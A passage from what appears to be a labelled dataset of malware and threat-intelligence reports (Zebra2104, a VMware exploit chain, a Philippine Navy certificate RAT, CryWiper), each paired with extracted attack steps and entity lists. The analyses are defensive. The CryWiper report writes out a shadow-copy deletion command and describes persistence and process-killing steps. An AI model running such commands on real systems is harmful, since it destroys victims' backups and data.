mipancepezc[.]usDomain kavamennci[.]usTable 2 - Additional .us domainsThe interlinking relationships between all these domains can be seen in Figure 1 below.3/24Figure 1 - Malspam distributionDridex MalspamTwo domains of particular interest to us were kavamennci[.]us and zensingergy[.]us. These were involved in a phishing campaign targeting Australian real estate companies and state government departments in September of 2020, which are evidenced as follows.The first spam-mail was sent from an address coming from the kavamennci[.]us domain, and it appears to target employees at one of the Australia's largest property groups. The mail was titled “Your Transaction was Approved 697169IR54253” and it contained an embedded hyperlink that decoded to “hxxps[:]//mail[.]premiumclube[.]org[.]br/zpsxxla.php.”4/24Figure 2 - Phishing email targeting employees at one of Australia’s largest property groupsThe second email was directed at an Australian government agency, and titled “Payment Notification-0782704YX50906.”5/24Figure 3 - Phishing email targeting an Australian Government AgencySent from an address originating from the “zensingergy[.]us” domain, this email contained a similar embedded link: “hxxps[:]//magesty[.]in-expedition[.]com/zxlbw.php.”In addition, the last portion of the embedded malicious links — “zpsxxla.php” and “zxlbw.php” — also appear in the Microsoft blog, and are mentioned as part of a Dridex campaign from September 2020 that was described by Microsoft as follows:“These Dridex campaigns utilized an Emotet loader and initial infrastructure for hosting, allowing the attackers to conduct a highly modular email campaign that delivered multiple distinct links to compromised domains. These domains employed heavy sandbox evasion and are connected by a series of PHP patterns ending in a small subset of options: zxlbw.php, yymclv.php, zpsxxla.php, or app.php.”This is significant because it demonstrates the power of open-source intelligence (OSINT) and threat hunting. Initially, we started off with one domain (trashborting[.]com), which helped us to unravel other threat actors that we will look at in more detail later. Although Dridex is not the target of this paper, it is certainly a noteworthy find to mention.Peering Down the Intelligence Rabbit HoleThe trashborting.com domain was registered with a ProtonMail email address (ivan.odencov1985[at]protonmail[.]com) and contained Russian WHOIS registrant information:6/24TypeIOCRegistrarPDR Ltd. d/b/a PublicDomainRegistry.comDomain Statusclient delete prohibitedclient update prohibitedclient delete prohibitedclient holdEmailNameOrganizationStreetCityStateIvan.odencov1985[at]protonmail[.]com (registrant, admin, tech)Ivan (registrant, admin, tech)--Moscow (registrant, admin, tech)Moscow (registrant, admin, tech)Postal Code123066 (registrant, admin, tech)CountryRU (registrant, admin, tech)Phone+7.993216690 (registrant, admin, tech)Name Serversns1.entrydns.netns2.entrydns.netns3.entrydns.netns4.entrydns.netTable 3 - Trashborting WHOIS informationThis email address was also used to register two additional sister domains on the same date: July 17, 2020. Both had been observed serving Cobalt Strike Beacon.7/24Figure 4 - Trashborting and sister domainsIn March of 2021, Sophos listed supercombinating[.]com as an indicator of compromise (IOC).8/24Figure 5 - Sophos MountLocker IOCsThe MountLocker group is a financially motivated threat group that offers a Ransomware-as-a- Service (RaaS) model; they have been active since July of 2020. As has become the trend with recent ransomware operators, MountLocker employs double extortion tactics. This means that the malware operators exfiltrate sensitive documents and data from the victim prior to encryption, then threaten to publish said data on the dark web should their ransom demands not be met.Such attacks typically leverage Cobalt Strike Beacon to both spread laterally and propagate the MountLocker ransomware within the victim network. In this instance, this is done via supercombinating[.]com.9/24Sophos has supposed that the MountLocker group has links to, or has in fact become, the recently emerged AstroLocker group. This is because one of the group’s ransomware binaries has been linked to a support site of AstroLocker. It’s possible that this group is trying to shed any notoriety or baggage that it had garnered through its previous malicious activities.For additional information, you can check out our blog on MountLocker, which sheds further light on affiliate operations and double extortion capabilities.MountLocker ActivityAt this point, we noticed that supercombinating[.]com had also resolved to the IP address 91.92.109[.]174, which itself had hosted the domain mentiononecommon[.]com. Both domains resolved to this IP in an alternating fashion between April and November of 2020, as illustrated in the image below.10/24Figure 6 - Domain resolutionThis alternating resolution timeline can be seen below:11/24Figure 7 - Alternating IP resolutionSo, what does this mean, and where does mentiononecommon[.]com fit into the puzzle? The answer to this question requires a little more background information to paint a clearer picture.Additional OSINT led to us uncover links between mentiononecommon[.]com and the APT group known as StrongPity. Before we discuss those connections, let’s look at who the StrongPity group are, and what they are known for.Why Hello There, StrongPity!StrongPity, aka Promethium (Microsoft), is an APT group that has been operational as far back as 2012. It was previously alleged that this group is Turkish state-sponsored, though this is unconfirmed.Their modus operandi has typically been to use watering hole attacks to deliver Trojanized versions of various commonly used utilities. To accomplish these attacks, a combination of imitation websites and redirects are employed to lure the victim into a false sense of security. Utilities such as WinRAR, Internet Download Manager, and CCleaner have all been victimized in the past to deliver the group’s malware.The scope of their activities includes victims based across several continents, as seen in Figure 8 below.Figure 8 - Countries targeted by StrongPityIn June of 2020, Cisco’s Talos Intelligence reported mentiononecommon[.]com as a StrongPity C2 server. The domain also served three files related to StrongPity, one of which was the previously timofei66[at]protonmail[.]com, which also has WHOIS registrant information pointing to Russia.While this is far from definitive evidence, it is certainly a notable similarity.TypeIOCWHOIS Server whois.namecheap.comRegistrarNameCheap, Inc.Domain StatusclientTransferProhibitedEmailNameTimofei66[at]protonmail[.]com (registrant, admin, tech)Timofei Solomin (registrant, admin, tech)Organization-StreetCityStateYU.gagarina, bld. 12/2, appt. 76 (registrant, admin, tech)Ufa (registrant, admin, tech)Respublika Bashkortostan (registrant, admin, tech)Postal Code49875 (registrant, admin, tech)CountryRUSSIAN FEDERATION (registrant, admin, tech)13/24Phone77347382066 (registrant, admin, tech)Table 5 - mentiononecommon[.]com WHOIS registrant informationFigure 9 - mentiononecommon[com] serving StrongPity binariesAt this point, we started to suspect that MountLocker and StrongPity may have worked together in some capacity. This theory seemed unlikely, as their motivations did not appear to align. Despite the improbability of the hypothesis, we set out to see whether we could prove it, and we stumbled upon yet another curious find.Three Groups — Is That All?14/24Through a tweet from The DFIR Report, we saw that more ransomware was deployed from supercombinating[.]com, but it was not MountLocker as we had seen previously. This time, Phobos ransomware took its place, which we confirmed through the linked Any.Run sandbox report.This raised more questions. Were MountLocker and Phobos possibly related? Were two different ransomware groups operating from the same infrastructure? Was this a delivery system? Was an IAB playing a part in all this?Figure 10 – Tweet by Paul Melson re: Cobalt Strike Beacon relating to supercombinating[.]comFigure 11 – Tweet by The DFIR Report re: Cobalt Strike Phobos deployment via supercombinating[.]comPhobos is a ransomware variant that was first seen in early 2019. It is thought to be based on the Dharma ransomware family. Unlike a lot of other ransomware operators that cast for larger “whale”-sized organizations, Phobos has been seen angling for small-to-medium-sized15/24organizations across a variety of industries, with its average ransom payment received being around $54,000 in July of 2021.A possible insight as to why the authors chose the name for their ransomware is that Phobos was the god of fear in ancient Greek mythology. Few malware groups are so direct about the feeling they seem to want to instill in their victims.A Mysterious Fourth Group EmergesThis new information presented a bit of a conundrum. If MountLocker owned the infrastructure, then there would be a slim chance of another ransomware operator also working from it, although it has happened before.Back in June 2020, the Maze threat actor group added stolen files to its leak site. However, upon visiting the leak site, the stolen data was actually provided by the LockBit threat actor group. When Bleeping Computer reached out to Maze for more information regarding the implied partnership between them and LockBit, the Maze group replied with the following:""In a few days another group will emerge on our news website, we all see in this cooperation the way leading to mutual beneficial outcome, for both actor groups and companies. Even more, they use not only our platform to post the data of companies, but also our experience and reputation, building the beneficial and solid future. We treat other groups as our partners, not as our competitors. Organizational questions is [sic] behind every successful business.”In several instances, a delay was observed between an initial compromise using Cobalt Strike and further ransomware being deployed. Based on these factors, we can infer that the infrastructure is not that of StrongPity, MountLocker, or Phobos, but of a fourth group that has facilitated the operations of the former three. This is either done by providing initial access, or by providing Infrastructure as a Service (IaaS).IABs: the LowdownAn IAB performs the first step in the kill chain of many attacks; this is to say they gain access into a victims' network through exploitation, phishing, or other means.Figure 12 - IAB’s operation workflow16/24Once they have established a foothold (i.e., a reliable backdoor into the victim network), they then list their access in underground forums on the dark web, advertising their wares in hopes of finding a prospective buyer.The price for access ranges from as little as $25, going up to thousands of dollars. Typically, the more annual revenue that the target organization generates, the higher the price an IAB charges for “access.”Upon successful sale agreement, the winning bidders will generally deploy their malware of choice. This can be anything from ransomware to infostealing malware, and everything in between.We believe that our three threat actors – MountLocker, Phobos and StrongPity, in this instance – sourced their access through these means.Additional IAB Infrastructure?We saw two new domains registered on July 21, 2021, both of which resolved to the same IP address of 87.120.37[.]120:ticket-one-two[.]com booking-sales[.]comFigure 13 - IP resolutionThat is the same IP that trashborting[.]com resolved to, as well as lionarivv[.]us!17/24Figure 14 - 87.120.37[.]120 reverse resolutionsTicket-one-two[.]com has not been used at the time of writing, however its counterpart, booking- sales[.]com, had served one specific item of note; a tiny, 13KB portable executable (PE) file that upon inspection proved to be a shellcode loader.This loader turned out to be loading a shellcode Cobalt Strike DNS stager, which is used to download a Cobalt Strike Beacon via DNS TXT records.Taking a Closer Look at the Loader/DNS StagerThe shellcode loader expects a specific command-line argument in order to execute properly, which it hashes and then checks against the value 0xB6E35C. Fortunately, we can just patch a comparison and proceed without a match.The file then allocates RWX memory using VirtualAlloc, and then decodes data stored within the binary into memory, using a combination of subtraction and division operations – no special cryptography necessary here.18/24Figure 15 – Subtraction and division decoding loopThe resulting data is a shellcode blob, which we can identify based on the initial bytes FC E8 89 00 00 00, a fairly typical opcode sequence for shellcode.Figure 16 - Resulting shellcodeDisassembling the shellcode in the disassembly tool IDA, we can immediately identify a new domain that appears to be trying to masquerade as a DNS name-server:Figure 17 - A new URL attempting to look like a name server19/24We can also see what appear to be 4-byte hex values being pushed onto the stack before a call. This is indicative of Windows API import name hashing, a common technique to masquerade the loading of API calls from identification during analysis. This can be seen in Figure 20, where C99CC96A is pushed onto the stack before a call to ebp.We then see that it performs a DNS query on the URL using DnsQueryA.Figure 18 - Using DnsQuery_A to query the website’s DNS recordsOnce it receives a DNS response, it parses out the TXT Record from the DNS response and checks its length, as shown in Figure 19.20/24Figure 19 - Extracting the TXT record length and data from the DnsQueryA resultThis behavior is typical of a DNS stager; it pulls down a later stage payload via the DNS TXT records, abusing the DNS protocol in an attempt to be stealthy. This is also why the domain name was set to masquerade as a DNS name server.When we look at the Cobalt Strike Malleable C2 documentation, we can see that the URL above in Figure 17 uses a strikingly similar domain in their example. For that reason, we believe this to be a Cobalt Strike DNS stager that will download a Cobalt Strike Beacon upon successful execution.Figure 20 – A striking similarity to the Cobalt Strike DNS server example from the developer’s documentation21/24One More Thing, Before You Go!Now that we’ve seen the potential IAB group infrastructure in all its glory, do you notice anything about the IPs discussed here?All the domains mentioned in this paper at one time resolved to IPs that were provided by the same Bulgarian Autonomous System Numbers (ASN), which belongs to Neterra Ltd.This is not to say we believe the threat actor to be Bulgarian, but that all their infrastructure is hosted with one specific company. Furthermore, Neterra isn’t known to be a bulletproof hosting provider; it’s more likely that it’s being abused to facilitate this malicious activity.The fact that all these IPs are on the same ASN helps us bind together the theory that this is in fact all the work of one threat group, underpinning the operation of the groups it sells its access to.Figure 21 - Bulgarian IP addresses on the same ASNFinding Beacons in the DarkFor those of you interested, here’s a shameless plug for our new book “Finding Beacons in the Dark: A Guide to Cyber Threat Intelligence,” which the BlackBerry Research & Threat Intelligence Team has lovingly crafted over the course of this year.In the book, we demonstrate our Cyber Threat Intelligence (CTI) lifecycle, and show how you can build your own automation system to hunt for threats. In this case, that threat would be the Cobalt Strike Team Server.We also give you an in-depth look at Beacon configuration and their Malleable C2 profiles, and reveal insights, trends, and discoveries from over 48,000 Beacons and 6,000 unique Team Servers.22/24In addition, we show you the power of intelligence correlation that can be gleaned from datasets such as these, including how it can be used to:Build profiles of threat actors Broaden knowledge of existing threat groups Track both ongoing and new threat actor campaignsThe end result is that you can then:Provide actionable intelligence to SOC analysis, IR teams and investigators Reduce “alert fatigue” Improve threat detection Fine-tune security solutions and servicesConclusionsAs is the case with many cyber investigations in today’s threat landscape, this journey began with the analysis of a Cobalt Strike Beacon and the data contained within its configuration. The presence of a single domain – trashborting[.]com – along with both its current and historical resolution information, led us to uncover links to many different campaigns and a new group that the BlackBerry Research & Intelligence Team named, and continues to track, as Zebra2104. This name stems from the use of initial access services that, as a byproduct, allow for threat actors to “hide in the herd.”One such campaign was the malspam infrastructure previously documented by Microsoft, which was seen to serve an assortment of malware – from ransomware to infostealers – and many more in between. This same infrastructure had also been observed waging a phishing campaign that targeted Australian entities, both in the governmental and private sector, in September of 2020.When we delved deeper, we found two sister domains that led us down further intelligence avenues, to ultimately identifying both a MountLocker and a Phobos intrusion from the same domain.We then identified another domain sharing a past IP resolution, linked to the StrongPity APT group by Talos Intelligence in June of 2020.With three seemingly unrelated threat groups using and sharing overlapping infrastructure, we asked ourselves the question, “What is the most plausible explanation for these peculiar links?” (Especially as these groups’ motives didn’t seem to align.)We concluded that this was not the work of the three groups together, but of a fourth player; an Initial Access Broker we dubbed Zebra2104, which provided the initial access into victim environments.The interlinking web of malicious infrastructure seen throughout this research has shown that, in a manner that mirrors the legitimate business world, cybercrime groups are in some cases run not unlike multinational organizations. They create partnerships and alliances to help advance their goals. If anything, it is safe to assume that these threat group “business partnerships” are going to become even more prevalent in future.23/24To counter this, it is only via the tracking, documenting, and sharing of intelligence in relation to these groups (and many more) that the wider security community can monitor and defend against them. This cooperation will continue to further our collective understanding of how cybercriminals operate.If the bad guys work together, so should we!24/24 ","1. The initial access broker Zebra2104 gains access to a victim's network through exploitation or phishing. 2. Zebra2104 sells access to the victim's network on underground forums to the highest bidder. 3. Threat actors such as MountLocker, Phobos, or StrongPity purchase access to the victim's network from Zebra2104. 4. The threat actor deploys their malware, such as ransomware or APT malware, within the victim's network. 5. The threat actor achieves their objectives, such as encrypting data for ransom or stealing sensitive information. ",valid_13,"['the initial access', 'Initial Access Broker', 'Zebra2104', 'exploitation', 'phishing', 'the victim', 'underground forums', 'the highest bidder', 'threat actors', 'MountLocker', 'Phobos', 'StrongPity', 'the threat actor', 'their malware', 'Ransomware', 'APT', 'data']",the initial access; Initial Access Broker; Zebra2104; exploitation; phishing; the victim; underground forums; the highest bidder; threat actors; MountLocker; Phobos; StrongPity; the threat actor; their malware; Ransomware; APT; data.
"blog.morphisec.com /vmware-identity-manager-attack-backdoor New Core Impact Backdoor Delivered Via VMWare VulnerabilityPosted by Morphisec Labs on April 25, 2022Morphisec is a world leader in preventing evasive polymorphic threats launched from zero-day exploits. On April 14 and 15, Morphisec identified exploitation attempts for a week-old VMware Workspace ONE Access (formerly VMware Identity Manager) remote code execution (RCE) vulnerability. BleepingComputer reports similar attempts have been seen in the wild. Due to indicators of a sophisticated Core Impact backdoor, Morphisec believes advanced persistent threat (APT) groups are behind these VMWare identity manager attack events. The tactics, techniques, and procedures used in the attack are common among groups such as the Iranian linked Rocket Kitten.VMWare is a $30 billion cloud computing and virtualization platform used by 500,000 organizations worldwide. A malicious actor exploiting this RCE vulnerability potentially gains an unlimited attack surface. This means highest privileged access into any components of the virtualized host and guest environment. Affected firms face significant security breaches, ransom, brand damage, and lawsuits.This new vulnerability is a server-side template injection that affects an Apache Tomcat component, and as a result, the malicious command is executed on the hosting server. As part of the attack chain, Morphisec has identified and prevented PowerShell commands executed as child processes to the legitimate Tomcat prunsrv.exe process application. A malicious actor with network access can use this vulnerability to achieve full remote code execution against VMware’s identity access management. Workspace ONE Access provides multi-factor authentication, conditional access, and single sign-on to SaaS, web, and native mobile apps.This attack turned around remarkably fast:A patch for the initial vulnerability was released on April 6 On April 11 a proof of concept for the attack appeared On April 13 exploits were identified in the wildAdversaries can use this attack to deploy ransomware or coin miners, as part of their initial access, lateral movement, or privilege escalation. Morphisec research observed attackers already exploiting this vulnerability to launch reverse HTTPS backdoors—mainly Cobalt Strike, Metasploit, or Core Impact beacons. With privileged access, these types of attacks may be able to bypass typical defenses including antivirus (AV) and endpoint detection and response (EDR).Morphisec Labs has analyzed this new attack in detail below.Morphisec console attack details Technical Analysis1/4Full attack chainThe attacker gains initial access to an environment by exploiting a VMWare Identity Manager Service vulnerability. The attacker can then deploy a PowerShell stager that downloads the next stage, which Morphisec Labs identified as the PowerTrash Loader. Finally, an advanced penetration testing framework—Core Impact—is injected into memory. VMWare Identity Manager VulnerabilitiesThe Morphisec blog post Log4j Exploit Hits Again: Vulnerable VMWare Horizon Servers at Risk showed how attackers previously exploited VMWare’s Horizon Tomcat service. Unfortunately, malice never sleeps. Threat actors are now exploiting another VMWare component, the VMWare Identity Manager service.Several vulnerabilities have recently been reported for this service:CVE- 22954VMware Workspace ONE Access, Identity Manager, and vRealize Automation contain two remote code execution vulnerabilities (CVE-2022-22957 and CVE-2022-22958). A malicious actor with administrative access can trigger the deserialization of untrusted data through malicious JDBC URI, which may result in remote code execution. VMware Workspace ONE Access, Identity Manager, and vRealize Automation contain two remote code execution vulnerabilities (CVE-2022-22957 and CVE-2022-22958). A malicious actor with administrative access can trigger the deserialization of untrusted data through malicious JDBC URI, which may result in remote code execution. VMware Workspace ONE Access and Identity Manager contains a remote code execution vulnerability due to server-side template injection. A malicious actor with network access can trigger a server-side template injection that may result in remote code execution.While CVE-2022-22957 and CVE-2022-22958 are RCE vulnerabilities, they require administrative access to the server. CVE-2022-22954 however, doesn’t, and already has an open-source proof of concept in the wild. Powershell StagerThe attacker exploited the service and ran the following PowerShell command:Stager encoded in base64Which translates to:Decoded stagerAs you can see at the end, this is an encoded command where each character is subtracted by one. When doing so we get the URL from which the next stage is downloaded:2/4Decoded #2 stager PowerTrash LoaderThe PowerTrash Loader is a highly obfuscated PowerShell script with approximately 40,000 lines of code.Snippet from the PowerTrash LoaderThis loader decompresses the deflated payload and reflectively loads it in memory, without leaving forensic evidence on the disk. We’ve previously seen the PowerTrash Loader leading to JSSLoader.This time the final payload was different—a Core Impact Agent. Core Impact AgentCore Impact is a penetration testing framework developed by Core Security. As with other penetration testing frameworks, these aren’t always used with good intentions. TrendMicro reported a modified version of Core Impact was used in the Woolen-GoldFish campaign tied to the Rocket Kitten APT35 group.We can extract the C2 address, client version, and communication encryption key located in an embedded string:C2 Server: 185.117.90[.]187Client Version: 7F F7 FF 83 (HEX)256-Bit Key: (ASCII)3/4Additional Threat RelationsA reverse look-up on the Stager server leads to a new web hosting server named ‘Stark Industries’ registered in London.Stager server IP reverse lookup resultThe company was registered on February 2022 and is linked to a person named Ivan Neculiti:Ivan Neculiti identity in suite.endole.co.ukThere is a dedicated profile page for him on hucksters.net which exposes spammers, fraudsters, and other bad actors.Ivan is infamous for owning web hosting companies used for malicious and illegal activities. Among them is pq[.]hosting which is easily correlated to stark-industries[.]solutions.Correlation between the web hosting companies Indicators of CompromiseStage1 Serving URL:hxxp://138.124.184[.]220/work_443.bin_m2.ps1Stage2 - work_443.bin_m2.ps1:746FFC3BB7FBE4AD229AF1ED9B6E1DB314880C0F9CB55AEC5F56DA79BCE2F79BStage3 - Core Impact:7BC14D231C92EEEB58197C9FCA5C8D029D7E5CF9FBFE257759F5C87DA38207D9C2 Server:185.117.90[.]1874/4 ",1. The threat actor exploits the remote code execution (RCE) vulnerability in VMware Workspace ONE Access. 2. The RCE exploit allows running malicious PowerShell commands as child processes of the legitimate Tomcat service. 3. A PowerShell stager is deployed that downloads the next stage PowerTrash loader. 4. The obfuscated PowerTrash loader reflectively loads and decompresses the final payload into memory without writing to disk. 5. The final payload is a Core Impact penetration testing framework backdoor configured with a C2 server. 6. The backdoor provides the threat actor access to initiate further malicious activities across the compromised network. ,valid_81,"['exploits', 'remote code execution', 'RCE) vulnerability', 'VMware Workspace ONE Access', 'PowerShell commands', 'child processes', 'Tomcat', 'a PowerShell stager', 'the next stage', 'PowerTrash loader', 'the final payload', 'memory', 'disk', 'Core Impact', 'C2 Server']",exploits; remote code execution; RCE) vulnerability; VMware Workspace ONE Access; PowerShell commands; child processes; Tomcat; a PowerShell stager; the next stage; PowerTrash loader; the final payload; memory; disk; Core Impact; C2 Server.
"decoded.avast.io /threatintel/avast-finds-compromised-philippine-navy-certificate-used-in-remote-access-tool/ Avast Finds Compromised Philippine Navy Certificate Used in Remote Access Tool ⋮ 3/28/2022by Threat Intelligence TeamMarch 28, 20224 min readAvast Threat Intelligence Team has found a remote access tool (RAT) actively being used in the wild in the Philippines that uses what appears to be a compromised digital certificate belonging to the Philippine Navy. This certificate is now expired but we see evidence it was in use with this malware in June 2020.Based on our research, we believe with a high level of confidence that the threat actor had access to the private key belonging to the certificate.We got in touch with CERT-PH, the National Computer Emergency Response Team for the Philippines to help us contact the navy. We have shared with them our findings. The navy security team later let us know that the incident has been resolved and no further assistance was necessary from our side.Because this is being used in active attacks now, we are releasing our findings immediately so organizations can take steps to better protect themselves. We have found that this sample is now available on VirusTotal. Compromised Expired Philippine Navy Digital Certificate In our analysis we found the sample connects to dost[.]igov-service[.]net:8443 using TLS in a statically linked OpenSSL library.A WHOIS lookup on the C&C domain gave us the following:1/4The digital certificate was pinned so that the malware requires the certificate to communicate.When we checked the digital certificate used for the TLS channel we found the following information:Some important things to note:The certificate is a valid certificate with a subject of *.navy.mil.ph, the Philippine Navy. The certificate has recently expired: it was valid for one year, from Sunday December 15, 2019 until Tuesday December 15, 2020. Our research shows that Censys saw this certificate employed by the actual navy.mil.ph websiteBased on our research, we believe with a high level of confidence that the threat actor had access to the private key belonging to the certificate.While the digital certificate is now expired we see evidence it was in use with this malware in June 2020.The malicious PE file was found with filename: C:\Windows\System32\wlbsctrl.dll and its hash is: 85FA43C3F84B31FBE34BF078AF5A614612D32282D7B14523610A13944AADAACB.In analyzing that malicious PE file itself, we found that the compilation timestamp is wrong or was edited. Specifically, the TimeDateStamp of the PE file was modified and set to the year 2004 in both the PE header and Debug Directory as shown below:2/4However, we found that the author used OpenSSL 1.1.1g and compiled it on April 21, 2020 as shown below:The username of the author was probably udste. This can be seen in the debug information left inside the used OpenSSL library.We found that the malware supported the following commands:run shellcode cancel data transfer list drives rename a file delete a file list directory contentSome additional items of note regarding the malicious PE file:All configuration strings in the malware are encrypted using AES-CBC with the exception of the mutex it uses.That mutex is used as-is without decryption: t7As7y9I6EGwJOQkJz1oRvPUFx1CJTsjzgDlm0CxIa4=. When this string is decrypted using the hard-coded key it decrypts to QSR_MUTEX_zGKwWAejTD9sDitYcK. We suspect that this is a failed attempt to disguise this malware as the infamous Quasar RAT malware. But this cannot be the case because this sample is written in C++ and the Quasar RAT is written in C#.Avast customers are protected against this malware.3/4Indicators of Compromise (IoC)Repository: url 85FA43C3F84B31FBE34BF078AF5A614612D32282D7B14523610A13944AADAACB C:\Windows\System32\wlbFile nameMutex t7As7y9I6EGwJOQkJz1oRvPUFx1CJTsjzgDlm0CxIa4=C&C server dost[.]igov-service[.]net:84432022 Copyright © Avast Software s.r.o.4/4 ","1. Compromise valid certificate: The threat actors compromised a legitimate digital certificate belonging to the Philippine Navy that was valid from December 2019 to December 2020. 2. Sign malware: The expired but still valid certificate was used to sign a remote access trojan (RAT) malware. 3. Deploy malware: The signed RAT was deployed in active attacks in the Philippines, abusing the validity of the Navy certificate. 4. Command and control: The RAT communicates with a C2 server at dost[.]igov-service[.]net over TLS using the pinned Navy certificate. 5. Malicious capabilities: The RAT has capabilities like executing shellcode, reading/writing files, deleting files, and listing drives and directories on the victim system. 6. Incident response: Avast notified Philippine CERT and the Navy about the compromise. The Navy stated the incident was resolved. 7. Protect users: Avast implemented protections for its users against this threat. ",valid_63,"['Compromise', 'valid certificate', 'the threat actor', 'the Philippine Navy', 'December', 'malware', 'use', 'Remote Access', '(RAT', 'active attacks', 'the Philippines', 'the navy', 'dost[.]igov-service[.]net', 'TLS', 'shellcode', 'drives', 'Avast', 'the incident']",Compromise; valid certificate; the threat actor; the Philippine Navy; December; malware; use; Remote Access; (RAT; active attacks; the Philippines; the navy; dost[.]igov-service[.]net; TLS; shellcode; drives; Avast; the incident.
"securelist-ru.translate.goog /novyj-troyanec-crywiper/106114/ New Trojan CryWiper pretends to be a ransomwareMost cyberattacks are financially motivated, but in recent years there has been an increase in the number of attacks whose goal is not to enrich, but to harm the victim. One of the tools of such attacks are wipers (from the English wiper) - programs that destroy data without the possibility of recovery. The most notable wipers to come out in 2022 include DoubleZero, IsaacWiper, HermeticWiper, CaddyWiper, WhisperGate, AcidRain, Industroyer2 and RuRansom.In the fall of 2022, our solutions detected attempts by a previously unknown Trojan, which we called CryWiper, to attack an organization's network in the Russian Federation. After examining a sample of malware, we found out that this Trojan, although it masquerades as a ransomware and extorts money from the victim for “decrypting” data, does not actually encrypt, but purposefully destroys data in the affected system. Moreover, an analysis of the Trojan's program code showed that this was not a developer's mistake, but his original intention. CryWiper Technical DetailsThe CryWiper sample that came to us is a 64-bit executable file for Windows OS. The malware was developed in C++ and compiled using the MinGW-w64 toolkit and the GCC compiler. This is not the most common approach among C/C++ malware developers for Windows — the Microsoft Visual Studio development environment is more commonly used for such purposes. Building with MinGW is advisable either when developing a cross-platform application for different operating systems (for example, under Windows, Linux and / or FreeBSD), or if the developer himself uses something other than Windows as1/8the main OS. Note that in the case of CryWiper, the first option is unlikely, since the Trojan uses many calls to WinAPI functions.Sample build date, according to header PE field: 2022-09-06 11:08:54. The Trojan sample was found along the following path:1 c:\windows\system32\browserupdate.exeCryWiper algorithmCreate a task in the schedulerAfter starting CryWiper using the Task Scheduler and the schtasks create command , it creates a task to run its own file every 5 minutes.Create a task in the schedulerCommunication with C&CThe Trojan then contacts its command and control server using an HTTP GET request and passes the name of the infected computer as a parameter.2/8CryWiper request and response from C&CIn response, the C&C server sends the string run or do not run , which controls the behavior of the Trojan. If run is returned , then CryWiper will immediately start malicious activity.In all other cases, special logic is executed, which, judging by the results of our analysis, is conceived as a delay of 4 days (345,600 seconds). However, it was poorly implemented: the code is written in such a way that the malware will under no circumstances wait for the specified time and will simply terminate execution if it has not received the run command. CryWiper saves the current time in the registry (parameter HKCU\Software\Sysinternals\BrowserUpdate\Timestamp ) just before checking the response from the server. Having received the command do not runor not given instructions, it calculates how many seconds have passed since the stored moment, and if this value is less than 345,600 seconds, exits. At the same time, it will never be more than 345,600 seconds - in fact, the check takes only a fraction of a second. And the next time it is launched (see above — the Trojan created a task in the scheduler for this purpose), CryWiper will overwrite the Timestamp value again .3/8Code that measures the time and checks the response from C&CStop processes, change settingsAfter receiving a run response , CryWiper stops processes related to the operation of MySQL and MS SQL database servers, MS Exchange mail server and MS Active Directory web services using the taskkill command. The Trojan does this in order to have access to files that would be occupied by these processes if they were normal.Stopping processes and deleting shadow copiesIn addition, the Trojan deletes shadow copies of files using the vssadmin delete shadows /for=c: /all command , which, however, only affects the C: drive. This is probably another oversight of the attacker.Also, an interesting detail is related to changing the HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections registry setting , which is responsible for preventing connections to the system via the Remote Desktop Protocol (RDP). In ransomware attacks, attackers often set this setting to 0 to allow RDP access to the system, such as for lateral distribution on a compromised network.Here we observe the opposite behavior: CryWiper sets the value to 1, which prohibits access via RDP.4/8RDP access deniedThe purpose of this action is not entirely clear. It is possible that in this way the Trojan developer is trying to make life more difficult for the security and IT specialists who will be involved in responding to the incident - due to this setting, they will not be able to remotely connect to the infected system without additional actions.Data destructionTo destroy user files, CryWiper generates a sequence of data using the well-known pseudo-random number generator ""Mersenne Vortex"" and writes this data instead of the original file content.When searching for custom files, CryWiper skips those that have extensions or are located in the directories indicated in the table.Ignored file extensions .CRYSubstrings in the path to ignored directories System Volume Information Trend MicroFiles with corrupted content receive an additional .CRY extension .5/8Part of the procedure that implements the Mersenne Vortex PRNG. Characteristic constants are distinguishedIt is noteworthy that the exact same algorithm for generating pseudo-random numbers was used by another viper - IsaacWiper. However, no other relationship between them could be found. In addition, they were used in attacks on various targets. So, IsaacWiper was seen in attacks on the public sector in Ukraine, and CryWiper, according to our data, attacked an organization in the Russian Federation.Part of a procedure that destroys the contents of filesCryWiper disguises itself as a ransomware and stores ransom demands in the README.txt file. The text of the requirements uses typical ransomware language, and also provides the Bitcoin wallet address for paying the ransom, the email address for contacting the attackers, and the infection ID.The CryWiper ID string is fixed, it is contained in the body of the Trojan and does not change from launch to launch. In most ransomware, the ID is unique for each victim and is needed by attackers to determine6/8which victim paid the ransom and which did not. Although there are exceptions to this rule: if a new Trojan sample is collected for each attack, then sometimes the ID is left fixed or even not used at all.One way or another, CryWiper deliberately destroys the contents of files, which means that it makes no sense for attackers to distinguish one victim from another - there is nothing to decrypt after infection anyway.Text of CryWiper requirements Relationship with other familiesIn terms of code and functionality, CryWiper is a new malware that is not related to existing families. However, among vipers, the generation of random values \u200b\u200bwith the help of the Mersenne Vortex is rarely used - simpler options are more common. The choice of algorithm in CryWiper coincides with the previously mentioned IsaaсWiper - the only one of the popular wipers that generates pseudo- random values using this algorithm.We found another rather interesting intersection with other malware when analyzing the email address in the note. It turned out that this address had already been used before, but not in wipers: it was contained in several ransomware samples (for example, MD5: 4A42F739CE694DB7B3CDD3C233CE7FB1 , 71D9E6EE26D46C4DBB3D8E6DF19DDA7D , 0C6D33DA653230F56A7168E73F144 ) . Two of them belong to the well-known Trojan-Ransom.Win32.Xorist ransomware family, and the third is a lesser- known example from the Trojan-Ransom.MSIL.Agent family. The earliest example using this address is dated mid-June 2017. ConclusionCryWiper positions itself as a ransomware program, that is, it claims that the victim's files are encrypted and, if a ransom is paid, they can be restored. However, this is a hoax: in fact, the data has been destroyed and cannot be returned. The activity of CryWiper once again shows that the payment of the ransom does not guarantee the recovery of files.7/8In many cases, wiper and ransomware incidents are caused by insufficient network security, and it is the strengthening of protection that should be paid attention to. We assume that the number of cyberattacks, including those using wipers, will grow, largely due to the unstable situation in the world. Therefore, the following will help reduce the likelihood of compromise and data loss during attacks by wipers and ransomware.Behavioral file analysis security solutions that detect and block malware, such as KES . MDR - and SOC services that allow timely detection of an intrusion and take action to respond. Dynamic analysis of mail attachments and blocking of malicious files and URLs. This will make email attacks, one of the most common vectors, more difficult. Such functionality is available, for example, in Kaspersky Anti Targeted Attack (KATA) . Conducting regular penetration testing and RedTeam projects. This will help to identify vulnerabilities in the organization's infrastructure, protect them, and thereby significantly reduce the attack surface for intruders. Threat data monitoring. To detect and block malicious activity in a timely manner, it is necessary to have up-to-date information about the tactics, tools, and infrastructure of intruders. This requires c:\windows\system32\browserupdate.exe - path to the 